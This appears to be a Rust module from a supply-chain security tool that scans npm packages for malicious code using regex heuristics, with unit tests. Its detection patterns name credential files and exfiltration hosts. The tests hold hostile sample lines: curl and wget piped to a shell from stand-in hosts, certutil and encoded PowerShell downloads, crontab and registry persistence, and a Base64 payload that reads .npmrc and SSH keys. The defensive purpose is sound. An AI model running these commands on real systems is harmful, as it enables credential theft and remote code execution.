//! Malicious-code heuristics for package files (CR-017, SPEC-006).
//!
//! Package files are read as text and matched against patterns taken from
//! real npm attacks (Shai-Hulud, the ua-parser-js and event-stream hijacks)
//! and GuardDog-style rules. Nothing is executed. A hit is a warning that
//! needs a one-time approval (`suspicious_code`, `approve`): heuristics have
//! false positives, so only OSV malware stays a hard denial (CR-003).
//!
//! Coverage is best effort and bounded (`MAX_*`). This layer adds evidence
//! for the approval; the sandbox (SPEC-007) is still the install-time
//! boundary, and nothing here makes runtime code safe.

use super::{truncate, PackageId, MAX_EVIDENCE_CHARS};
use crate::protocol::{Finding, FindingAction, FindingKind};
use regex::Regex;
use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;
use std::sync::OnceLock;

/// Larger files are skipped (bundles of this size are not hand-written payloads).
const MAX_FILE: u64 = 16 << 20;
/// Bytes read per package before the walk stops.
const MAX_PKG: u64 = 64 << 20;
const MAX_FILES: usize = 20_000;
/// Encoded blobs are decoded and rescanned this many levels deep.
const MAX_DEPTH: usize = 2;
const MAX_DECODED: usize = 4 << 20;
const MAX_BLOBS_PER_TEXT: usize = 32;
/// Findings per package; the rest are summarised in one extra finding.
const MAX_FINDINGS: usize = 8;
const SNIPPET_CHARS: usize = 100;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Rule {
    HiddenCode,
    CredentialHarvest,
    EnvHarvest,
    DownloadExec,
    DropSite,
    Persistence,
    CiBackdoor,
}

impl Rule {
    pub fn id(self) -> &'static str {
        match self {
            Rule::HiddenCode => "hidden-code",
            Rule::CredentialHarvest => "credential-harvest",
            Rule::EnvHarvest => "env-harvest",
            Rule::DownloadExec => "download-exec",
            Rule::DropSite => "drop-site",
            Rule::Persistence => "persistence",
            Rule::CiBackdoor => "ci-backdoor",
        }
    }

    fn message(self) -> &'static str {
        match self {
            Rule::HiddenCode => "runs hidden code: it decodes an encoded string and executes it",
            Rule::CredentialHarvest => {
                "reads several credential stores (npm, SSH, cloud, Git, browser or wallet files)"
            }
            Rule::EnvHarvest => "collects environment variables, where tokens and keys are kept",
            Rule::DownloadExec => "downloads a program from the internet and runs it",
            Rule::DropSite => "contains an address commonly used to receive stolen data",
            Rule::Persistence => "changes startup files so that code runs again later",
            Rule::CiBackdoor => "writes GitHub Actions workflow files",
        }
    }
}

/// Where the matched text runs.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum When {
    /// A lifecycle script or a file it runs: executes in the sandbox.
    Install,
    /// Other package code: executes when the project loads the package.
    Runtime,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub rule: Rule,
    pub line: usize,
    pub snippet: String,
    /// Found inside decoded (Base64) data rather than the file text itself.
    pub decoded: bool,
}

struct Rx {
    hidden: Vec<Regex>,
    blob: Regex,
    creds: Vec<Regex>,
    env: Vec<Regex>,
    /// Download commands: install-time text only (helper scripts and help
    /// text in runtime code mention downloads without running them).
    download: Vec<Regex>,
    /// Downloads inside an exec/spawn string, and encoded PowerShell: any text.
    download_exec: Vec<Regex>,
    drop_host: Regex,
    raw_ip: Regex,
    /// Startup files and folders; a hit needs a file write next to it.
    persist_target: Regex,
    /// Commands that register code to run later.
    persist_cmd: Regex,
    /// `>> ~/.bashrc` on a non-comment shell line (install-time text).
    persist_append: Regex,
    write_call: Regex,
    exec_call: Regex,
    workflows: Regex,
    dir_write_call: Regex,
}

fn rx() -> &'static Rx {
    static RX: OnceLock<Rx> = OnceLock::new();
    RX.get_or_init(|| {
        let r = |p: &str| Regex::new(p).expect("static pattern");
        // A downloader and a URL inside one exec/spawn string literal.
        let in_exec = |q: char| {
            r(&format!(
                r#"\b(?:exec|execSync|execFile|execFileSync|spawn|spawnSync)\s*\(\s*{q}[^{q}\n]{{0,300}}?\b(?i:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|powershell|certutil|bitsadmin)\b[^{q}\n]{{0,300}}?https?://"#
            ))
        };
        Rx {
            hidden: vec![
                // eval / Function / exec of freshly decoded text.
                r(r#"(?:\beval|\bnew\s+Function|\bFunction|\.runIn(?:This|New)?Context|\bexecSync|\bexec)\s*\(\s*(?:Buffer\.from|atob|unescape|decodeURIComponent|String\.fromCharCode)\s*\("#),
                // eval of a long Base64-only literal.
                r(r#"(?:\beval|\bnew\s+Function)\s*\(\s*['"`][A-Za-z0-9+/=]{200,}"#),
                // eval of a long chain of \x escapes.
                r(r#"\beval\s*\(\s*['"](?:\\x[0-9a-fA-F]{2}){32,}"#),
            ],
            blob: r(r#"(?:Buffer\.from|atob)\(\s*['"`]([A-Za-z0-9+/=]{64,})['"`]"#),
            creds: vec![
                r(r#"\.npmrc\b"#),
                r(r#"\.ssh['"/\\]|\bid_(?:rsa|ed25519|ecdsa|dsa)\b"#),
                r(r#"\.aws['"/\\]"#),
                r(r#"\.git-credentials\b"#),
                r(r#"['"/\\]gh['"/\\,\s]+hosts\.yml|GitHub CLI"#),
                r(r#"\.docker['"/\\,\s]+config\.json|\.kube['"/\\,\s]+config\b"#),
                r(r#"application_default_credentials\.json|gcloud['"/\\,\s]+credentials"#),
                r(r#"\bLogin Data\b|\blogins\.json\b|\bcookies\.sqlite\b"#),
                r(r#"\bwallet\.dat\b|\bExodus['"/\\]|\.electrum\b|keystore['"/\\]UTC--"#),
                r(r#"\.pypirc\b"#),
            ],
            env: vec![
                r(r#"JSON\.stringify\(\s*process\.env\s*[,)]"#),
                // Case-sensitive on purpose: `npm_config_*` readers are not token hunts.
                r(r#"Object\.(?:keys|entries|values)\(\s*process\.env\s*\)[\s\S]{0,200}?(?:TOKEN|SECRET|PASSW|AWS_|GITHUB_|NPM_TOKEN)"#),
            ],
            download: vec![
                r(r#"(?i)\b(?:curl|wget)\b[^\n;&|]*\bhttps?://[^\n;&|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b"#),
                r(r#"(?i)\b(?:curl|wget)\b[^\n'"`]*?\s(?:-o|-O|--output|--output-document)\s[^\n'"`]*?https?://"#),
                r(r#"(?i)\b(?:curl|wget)\b[^\n'"`]*?https?://[^\n'"`\s]+\s+(?:-o|-O|--output)\s"#),
                r(r#"(?i)\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer)\s+(?:-\w+\s+)*['"]?https?://"#),
                r(r#"(?i)\.(?:DownloadString|DownloadFile|DownloadData)\s*\(\s*['"]https?://"#),
                r(r#"(?i)\bcertutil(?:\.exe)?\b[^\n]{0,40}-urlcache|\bbitsadmin(?:\.exe)?\b[^\n]{0,40}/transfer|\bmshta(?:\.exe)?\s+['"]?https?://"#),
            ],
            download_exec: vec![
                in_exec('\''),
                in_exec('"'),
                in_exec('`'),
                r(r#"(?i)\bpowershell(?:\.exe)?\b[^\n]{0,80}?\s-(?:e|ec|en|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}"#),
            ],
            drop_host: r(r#"(?i)\b(?:discord(?:app)?\.com/api/webhooks|webhook\.site|pipedream\.net|requestbin\.(?:com|net)|requestcatcher\.com|hookbin\.com|beeceptor\.com|[a-z0-9-]+\.ngrok(?:-free)?\.(?:io|app|dev)|interact\.sh|oast\.(?:pro|live|site|online|fun|me)|burpcollaborator\.net|oastify\.com|canarytokens\.com|transfer\.sh|pastebin\.com/raw|0x0\.st|bashupload\.com|temp\.sh|filebin\.net)"#),
            raw_ip: r(r#"\bhttps?://(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b(/dns-query)?"#),
            persist_target: r(r#"(?i)\.bashrc\b|\.bash_profile\b|\.zshrc\b|\.zprofile\b|LaunchAgents|LaunchDaemons|Start Menu['"/\\,\s]+Programs['"/\\,\s]+Startup|\.config['"/\\,\s]+autostart"#),
            persist_cmd: r(r#"(?i)\breg(?:\.exe)?['"]?\s*[,\s]\s*\[?\s*['"]?add\b[^\n]{0,200}?CurrentVersion\\{1,2}Run\b|\|\s*crontab\s+-(?:['"\s)]|$)|\bschtasks(?:\.exe)?\b[^\n]{0,40}/create\b|\bsystemctl\s+--user\s+enable\b"#),
            persist_append: r(r#"(?m)^[ \t]*[^#\s\n][^\n]*>>\s*["']?(?:~|\$HOME|\$\{HOME\})/\.(?:bashrc|bash_profile|zshrc|zprofile)\b"#),
            write_call: r(r#"(?:appendFile|writeFile|createWriteStream|copyFile)(?:Sync)?\s*\("#),
            exec_call: r(r#"\b(?:exec|execSync|execFile|execFileSync|spawn|spawnSync)\s*\("#),
            workflows: r(r#"\.github['"/\\,\s]+workflows"#),
            dir_write_call: r(r#"(?:writeFile|appendFile|createWriteStream|mkdir)(?:Sync)?\s*\("#),
        }
    })
}

/// Whether `re` matches within `before` bytes before and `after` bytes after
/// `[start, end)`: the "same statement" test used by the write-based rules.
fn near(text: &str, start: usize, end: usize, re: &Regex, before: usize, after: usize) -> bool {
    let mut a = start.saturating_sub(before);
    while !text.is_char_boundary(a) {
        a -= 1;
    }
    let mut b = (end + after).min(text.len());
    while !text.is_char_boundary(b) {
        b += 1;
    }
    re.is_match(&text[a..b])
}

/// Rule hits in one text. `decoded` blobs are rescanned up to `MAX_DEPTH`.
pub fn hits(text: &str, when: When) -> Vec<Hit> {
    let mut out = Vec::new();
    scan_text(text, when, 0, None, &mut out);
    out
}

fn scan_text(text: &str, when: When, depth: usize, outer_line: Option<usize>, out: &mut Vec<Hit>) {
    let rx = rx();
    let add = |rule: Rule, at: usize, out: &mut Vec<Hit>| {
        out.push(Hit {
            rule,
            line: outer_line.unwrap_or_else(|| line_of(text, at)),
            snippet: snippet(text, at),
            decoded: outer_line.is_some(),
        });
    };
    let install = when == When::Install;

    if let Some(m) = rx.hidden.iter().find_map(|re| re.find(text)) {
        add(Rule::HiddenCode, m.start(), out);
    }
    let cred_hits: Vec<usize> = rx
        .creds
        .iter()
        .filter_map(|re| re.find(text).map(|m| m.start()))
        .collect();
    if cred_hits.len() >= 2 {
        add(
            Rule::CredentialHarvest,
            *cred_hits.iter().min().expect("two hits"),
            out,
        );
    }
    if let Some(m) = rx.env.iter().find_map(|re| re.find(text)) {
        add(Rule::EnvHarvest, m.start(), out);
    }
    let download = rx
        .download_exec
        .iter()
        .chain(if install { &rx.download[..] } else { &[] })
        .filter_map(|re| re.find(text))
        .map(|m| m.start())
        .min();
    if let Some(at) = download {
        add(Rule::DownloadExec, at, out);
    }
    if let Some(m) = rx.drop_host.find(text) {
        add(Rule::DropSite, m.start(), out);
    } else if let Some(at) = public_ip_url(text) {
        add(Rule::DropSite, at, out);
    }
    let persist = rx
        .persist_target
        .find_iter(text)
        .take(64)
        .find(|m| near(text, m.start(), m.end(), &rx.write_call, 200, 300))
        .map(|m| m.start())
        .or_else(|| {
            rx.persist_cmd
                .find_iter(text)
                .take(64)
                .find(|m| install || near(text, m.start(), m.start(), &rx.exec_call, 200, 0))
                .map(|m| m.start())
        })
        .or_else(|| {
            install
                .then(|| rx.persist_append.find(text).map(|m| m.start()))
                .flatten()
        });
    if let Some(at) = persist {
        add(Rule::Persistence, at, out);
    }
    if let Some(m) = rx
        .workflows
        .find_iter(text)
        .take(64)
        .find(|m| near(text, m.start(), m.end(), &rx.dir_write_call, 300, 300))
    {
        add(Rule::CiBackdoor, m.start(), out);
    }

    if depth >= MAX_DEPTH {
        return;
    }
    for cap in rx.blob.captures_iter(text).take(MAX_BLOBS_PER_TEXT) {
        let m = cap.get(1).expect("group 1");
        if m.len() > MAX_DECODED * 4 / 3 + 4 {
            continue;
        }
        let Some(bytes) = decode_base64(m.as_str()) else {
            continue;
        };
        if !looks_like_text(&bytes) {
            continue;
        }
        let line = outer_line.unwrap_or_else(|| line_of(text, m.start()));
        scan_text(
            &String::from_utf8_lossy(&bytes),
            when,
            depth + 1,
            Some(line),
            out,
        );
    }
}

/// First `http(s)://a.b.c.d` URL whose address is public (not loopback,
/// private, link-local, CGNAT, documentation, multicast or reserved).
fn public_ip_url(text: &str) -> Option<usize> {
    for cap in rx().raw_ip.captures_iter(text) {
        if cap.get(5).is_some() {
            continue; // DNS-over-HTTPS endpoint
        }
        let o: Vec<u32> = (1..=4)
            .map(|i| cap[i].parse::<u32>().unwrap_or(999))
            .collect();
        if o.iter().any(|&x| x > 255) {
            continue;
        }
        let private = matches!(
            (o[0], o[1], o[2]),
            (0, _, _)
                | (10, _, _)
                | (127, _, _)
                | (169, 254, _)
                | (192, 168, _)
                | (192, 0, 2)
                | (198, 51, 100)
                | (203, 0, 113)
        ) || (o[0] == 172 && (16..=31).contains(&o[1]))
            || (o[0] == 100 && (64..=127).contains(&o[1]))
            || (o[0] == 198 && (o[1] == 18 || o[1] == 19))
            || o[0] >= 224;
        if !private {
            return Some(cap.get(0).expect("match").start());
        }
    }
    None
}

fn line_of(text: &str, at: usize) -> usize {
    text.as_bytes()[..at]
        .iter()
        .filter(|&&b| b == b'\n')
        .count()
        + 1
}

fn snippet(text: &str, at: usize) -> String {
    let mut start = at.saturating_sub(20);
    while !text.is_char_boundary(start) {
        start -= 1;
    }
    let s: String = text[start..]
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .take(SNIPPET_CHARS)
        .collect();
    crate::redact::redact_url_credentials(&s.split_whitespace().collect::<Vec<_>>().join(" "))
}

fn looks_like_text(bytes: &[u8]) -> bool {
    let probe = &bytes[..bytes.len().min(4096)];
    let odd = probe
        .iter()
        .filter(|&&b| b < 0x09 || (0x0e..0x20).contains(&b))
        .count();
    !probe.is_empty() && odd * 20 < probe.len()
}

/// Standard Base64 (padding optional); `None` on any other character.
fn decode_base64(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes().take_while(|&c| c != b'=') {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        } as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// Files worth reading: scripts a package can run, by extension or shebang.
fn candidate(name: &str, head: &[u8]) -> bool {
    let lower = name.to_ascii_lowercase();
    const EXTS: [&str; 12] = [
        ".js", ".cjs", ".mjs", ".jsx", ".sh", ".bash", ".ps1", ".psm1", ".cmd", ".bat", ".py",
        ".vbs",
    ];
    EXTS.iter().any(|e| lower.ends_with(e)) || (!lower.contains('.') && head.starts_with(b"#!"))
}

fn is_test_path(rel: &str) -> bool {
    let l = rel.to_ascii_lowercase();
    l.split('/').any(|c| {
        matches!(
            c,
            "test" | "tests" | "__tests__" | "__test__" | "spec" | "__mocks__"
        )
    }) || l.contains(".test.")
        || l.contains(".spec.")
}

/// Package-relative paths of candidate files, nested packages excluded
/// (`node_modules` entries are reviewed as packages of their own).
fn walk(root: &Path) -> Vec<String> {
    fn go(dir: &Path, rel: &str, out: &mut Vec<String>, seen: &mut usize) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        let mut entries: Vec<_> = entries.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            if *seen >= MAX_FILES {
                return;
            }
            *seen += 1;
            let name = e.file_name().to_string_lossy().into_owned();
            let Ok(ft) = e.file_type() else { continue };
            let path = if rel.is_empty() {
                name.clone()
            } else {
                format!("{rel}/{name}")
            };
            if ft.is_dir() {
                if name != "node_modules" && name != ".git" {
                    go(&e.path(), &path, out, seen);
                }
            } else if ft.is_file() {
                out.push(path);
            }
        }
    }
    let mut out = Vec::new();
    go(root, "", &mut out, &mut 0);
    out
}

/// Review one package directory. `scripts` are its lifecycle commands and
/// `install_files` the package-relative files they run; both count as
/// install-time, everything else as runtime code.
pub fn scan_package(
    pkg: &PackageId,
    dir: &Path,
    scripts: &[(String, String)],
    install_files: &BTreeSet<String>,
) -> Vec<Finding> {
    // (when, rule, location) -> hit; first location per rule and file wins.
    let mut found: BTreeMap<(When, Rule, String), Hit> = BTreeMap::new();
    let mut record = |when: When, file: &str, hits: Vec<Hit>| {
        for h in hits {
            found.entry((when, h.rule, file.to_string())).or_insert(h);
        }
    };
    for (name, cmd) in scripts {
        record(
            When::Install,
            &format!("package.json#scripts.{name}"),
            hits(cmd, When::Install),
        );
    }
    let mut total = 0u64;
    for rel in walk(dir) {
        let name = rel.rsplit('/').next().unwrap_or(&rel);
        // Only extensionless files can still qualify by their shebang.
        if !candidate(name, b"") && name.contains('.') {
            continue;
        }
        let full = dir.join(&rel);
        let Ok(meta) = std::fs::metadata(&full) else {
            continue;
        };
        if meta.len() > MAX_FILE {
            continue;
        }
        if total + meta.len() > MAX_PKG {
            break;
        }
        let Ok(bytes) = std::fs::read(&full) else {
            continue;
        };
        if !candidate(name, &bytes[..bytes.len().min(2)]) {
            continue;
        }
        total += bytes.len() as u64;
        if bytes[..bytes.len().min(8192)].contains(&0) {
            continue;
        }
        let when = if install_files.contains(&rel) {
            When::Install
        } else {
            When::Runtime
        };
        // A package's own tests are not loaded by its users (install-time
        // files are always scanned, whatever their path).
        if when == When::Runtime && is_test_path(&rel) {
            continue;
        }
        record(when, &rel, hits(&String::from_utf8_lossy(&bytes), when));
    }

    let target = pkg.display();
    let total_hits = found.len();
    let mut out: Vec<Finding> = found
        .into_iter()
        .take(MAX_FINDINGS)
        .map(|((when, rule, file), h)| {
            let place = match when {
                When::Install => "in an install script (it runs in the sandbox)",
                When::Runtime => {
                    "in package code that runs when your project loads the package, outside the sandbox"
                }
            };
            let inner = if h.decoded { " (inside decoded data)" } else { "" };
            Finding::new(
                FindingKind::SuspiciousCode,
                FindingAction::Approve,
                "npm.code",
                truncate(
                    &format!("{} {place}{inner}: `{}`", rule.message(), h.snippet),
                    MAX_EVIDENCE_CHARS,
                ),
            )
            .target(target.clone())
            .location(if file.starts_with("package.json#") {
                file
            } else {
                format!("{file}:{}", h.line)
            })
        })
        .collect();
    if total_hits > MAX_FINDINGS {
        out.push(
            Finding::new(
                FindingKind::SuspiciousCode,
                FindingAction::Approve,
                "npm.code",
                format!(
                    "{} more suspicious-code matches in this package are not listed",
                    total_hits - MAX_FINDINGS
                ),
            )
            .target(target),
        );
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::scan::Ecosystem;

    fn rules(text: &str) -> Vec<Rule> {
        rules_at(text, When::Install)
    }

    fn rt(text: &str) -> Vec<Rule> {
        rules_at(text, When::Runtime)
    }

    fn rules_at(text: &str, when: When) -> Vec<Rule> {
        let mut r: Vec<Rule> = hits(text, when).into_iter().map(|h| h.rule).collect();
        r.sort();
        r.dedup();
        r
    }

    #[test]
    fn hidden_code() {
        assert_eq!(
            rules("eval(Buffer.from('aGk=','base64').toString())"),
            [Rule::HiddenCode]
        );
        assert_eq!(rules("new Function(atob(x))()"), [Rule::HiddenCode]);
        assert_eq!(
            rules(&format!("eval('{}')", "QUJD".repeat(60))),
            [Rule::HiddenCode]
        );
        assert_eq!(
            rules(&format!("eval('{}')", r"\x41".repeat(40))),
            [Rule::HiddenCode]
        );
        // Ordinary eval, `isFunction(` and webpack's eval devtool are not hidden code.
        assert!(rules("eval('1 + 1'); isFunction(Buffer.from(x))").is_empty());
        assert!(rules(r#"eval("var a = 1;\n//# sourceURL=webpack://x")"#).is_empty());
    }

    #[test]
    fn credential_harvest_needs_two_stores() {
        let one = "fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'))";
        assert!(rules(one).is_empty(), "the AWS SDK reads only its own file");
        assert!(rules(
            "read(path.join(HOME, '.npmrc')); read(path.join(HOME, '.ssh', 'id_ed25519'))"
        )
        .contains(&Rule::CredentialHarvest));
        assert!(
            rules("x('.git-credentials'); y(\"GitHub CLI\", 'hosts.yml')")
                .contains(&Rule::CredentialHarvest)
        );
    }

    #[test]
    fn env_harvest() {
        assert_eq!(
            rules("send(JSON.stringify(process.env))"),
            [Rule::EnvHarvest]
        );
        assert_eq!(
            rules("Object.keys(process.env).filter((k) => /TOKEN|SECRET/i.test(k))"),
            [Rule::EnvHarvest]
        );
        assert!(
            rules("const env = { ...process.env, FOO: '1' }; Object.keys(process.env).length")
                .is_empty()
        );
        // node-gyp and node-pre-gyp read `npm_config_*`: not a token hunt.
        assert!(rules(
            "Object.keys(process.env).filter((k) => npmConfigPrefix.test(k) || npmPackage)"
        )
        .is_empty());
    }

    #[test]
    fn download_exec() {
        for t in [
            "curl -fsSL https://evil.example/x.sh | bash",
            "wget -qO- http://evil.example/i | sh",
            "curl -fsS -m 8 -o stage2.sh https://1.2.3.4/stage2.sh",
            "powershell -NoProfile -Command \"iwr -UseBasicParsing https://e.example/s.ps1 -OutFile s.ps1\"",
            "(New-Object Net.WebClient).DownloadString('https://e.example/a')",
            "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
            "certutil -urlcache -split -f http://e.example/a.exe",
        ] {
            assert!(rules(t).contains(&Rule::DownloadExec), "{t}");
        }
        assert!(rules("curl --version; see https://curl.se").is_empty());
        // Runtime code: help text and helper scripts that mention downloads are fine,
        // a download inside an exec string is not.
        assert!(rt("console.log('$ curl https://raw.example/install.sh | bash')").is_empty());
        assert!(rt("cd /tmp\ncurl -L -o ./chrome.dmg https://dl.google.com/chrome.dmg").is_empty());
        assert!(rt(r#"{value:"invoke-restmethod",title:"Invoke-RestMethod",link:"https://docs.microsoft.com/x"}"#).is_empty());
        assert_eq!(
            rt("cp.execSync('curl -fsSL https://e.example/i | sh')"),
            [Rule::DownloadExec]
        );
        assert!(rt(r#"cp.execSync('powershell -NoProfile -Command "iwr -UseBasicParsing https://1.1.1.1/s -OutFile s"')"#)
            .contains(&Rule::DownloadExec));
        assert_eq!(
            rt("x = 'powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'"),
            [Rule::DownloadExec]
        );
    }

    #[test]
    fn drop_sites_and_public_ips() {
        assert_eq!(
            rules("post('https://discord.com/api/webhooks/1/abc')"),
            [Rule::DropSite]
        );
        assert_eq!(rules("https.get('https://1.1.1.1/')"), [Rule::DropSite]);
        assert_eq!(rules("fetch('http://45.9.148.108/c')"), [Rule::DropSite]);
        for t in [
            "http://127.0.0.1:8080",
            "http://192.168.1.10/",
            "http://10.0.0.1",
            "https://172.20.0.1",
            "https://1.1.1.1/dns-query",
            "http://0.0.0.0:3000",
            "http://999.1.1.1",
        ] {
            assert!(rules(t).is_empty(), "{t}");
        }
    }

    #[test]
    fn persistence_and_ci_backdoor_need_a_write() {
        assert_eq!(
            rules("fs.appendFileSync(path.join(HOME, '.bashrc'), 'x')"),
            [Rule::Persistence]
        );
        assert_eq!(
            rules(
                r"execFileSync('reg', ['add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'])"
            ),
            [Rule::Persistence]
        );
        assert!(rules("// add this line to your ~/.bashrc").is_empty());
        // Shell-completion help text (yargs, npm, nx, pm2) is not persistence.
        assert!(rules("#    {{app_path}} {{completion_command}} >> ~/.bashrc\n").is_empty());
        assert!(rt(
            "'# or {{app_path}} completion >> ~/.zshrc\\n# or ~/.zprofile on OSX.' + appendFile"
        )
        .is_empty());
        assert!(rt("pm2 completion >> ~/.bashrc (or ~/.zshrc)").is_empty());
        // A real append in an install script, and cron/registry commands.
        assert_eq!(
            rules("echo 'curl x | sh' >> ~/.bashrc"),
            [Rule::Persistence]
        );
        assert_eq!(
            rules("execSync('(crontab -l; echo \"* * * * * x\") | crontab -')"),
            [Rule::Persistence]
        );
        assert_eq!(
            rt("execSync('(crontab -l; echo \"* * * * * x\") | crontab -')"),
            [Rule::Persistence]
        );
        assert!(rt("docs: run `(crontab -l; echo job) | crontab -` yourself").is_empty());
        assert_eq!(
            rules("fs.mkdirSync(path.join(P, '.github', 'workflows')); fs.writeFileSync(f, y)"),
            [Rule::CiBackdoor]
        );
        assert!(rules("see .github/workflows/ci.yml").is_empty());
        let far = format!(
            "msg('add one at .github/workflows/deploy.yml');{}fs.writeFileSync(a, b)",
            " ".repeat(400)
        );
        assert!(
            rules(&far).is_empty(),
            "a write elsewhere in a bundle is not a CI backdoor"
        );
    }

    #[test]
    fn decoded_payloads_are_rescanned() {
        let inner = "read(path.join(H, '.npmrc')); read(path.join(H, '.ssh', 'id_rsa')); JSON.stringify(process.env)";
        let b64 = {
            const A: &[u8; 64] =
                b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            let mut s = String::new();
            for c in inner.as_bytes().chunks(3) {
                let n = (c[0] as u32) << 16
                    | (*c.get(1).unwrap_or(&0) as u32) << 8
                    | *c.get(2).unwrap_or(&0) as u32;
                for i in 0..4 {
                    if i <= c.len() {
                        s.push(A[(n >> (18 - 6 * i) & 63) as usize] as char);
                    } else {
                        s.push('=');
                    }
                }
            }
            s
        };
        assert_eq!(decode_base64(&b64).unwrap(), inner.as_bytes());
        let text = format!("// header\neval(Buffer.from('{b64}','base64').toString());\n");
        let h = hits(&text, When::Runtime);
        assert!(h
            .iter()
            .any(|h| h.rule == Rule::HiddenCode && !h.decoded && h.line == 2));
        assert!(h
            .iter()
            .any(|h| h.rule == Rule::CredentialHarvest && h.decoded && h.line == 2));
        assert!(h.iter().any(|h| h.rule == Rule::EnvHarvest && h.decoded));
    }

    #[test]
    fn package_scan_labels_install_and_runtime_and_skips_nested_packages() {
        let d = tempfile::tempdir().unwrap();
        let w = |p: &str, t: &str| {
            let f = d.path().join(p);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(f, t).unwrap();
        };
        w("package.json", "{}");
        w(
            "index.js",
            "module.exports = 1;\nhttps.get('https://webhook.site/x')\n",
        );
        w("lib/setup.js", "send(JSON.stringify(process.env))");
        w("README.md", "curl https://x.example/i | sh");
        w("test/fixture.js", "fetch('https://webhook.site/abc')");
        w("lib/util.spec.js", "eval(atob(x))");
        w("node_modules/dep/index.js", "eval(atob(x))");
        let pkg = PackageId {
            ecosystem: Ecosystem::Npm,
            name: "p".into(),
            version: "1.0.0".into(),
        };
        let install: BTreeSet<String> = ["lib/setup.js".to_string()].into();
        let scripts = vec![("postinstall".to_string(), "node lib/setup.js".to_string())];
        let f = scan_package(&pkg, d.path(), &scripts, &install);
        assert_eq!(f.len(), 2, "{f:#?}");
        assert!(f.iter().all(|f| f.kind == FindingKind::SuspiciousCode
            && f.action == FindingAction::Approve
            && f.target.as_deref() == Some("npm:p@1.0.0")));
        let by_loc: BTreeMap<_, _> = f
            .iter()
            .map(|f| (f.location.clone().unwrap(), f.evidence.clone()))
            .collect();
        assert!(by_loc["lib/setup.js:1"].contains("install script"));
        assert!(by_loc["index.js:2"].contains("outside the sandbox"));
    }

    #[test]
    fn findings_are_capped_per_package() {
        let d = tempfile::tempdir().unwrap();
        for i in 0..12 {
            std::fs::write(d.path().join(format!("f{i}.js")), "eval(atob(x))").unwrap();
        }
        let pkg = PackageId {
            ecosystem: Ecosystem::Npm,
            name: "p".into(),
            version: "1".into(),
        };
        let f = scan_package(&pkg, d.path(), &[], &BTreeSet::new());
        assert_eq!(f.len(), MAX_FINDINGS + 1);
        assert!(f.last().unwrap().evidence.starts_with("4 more"));
    }
}
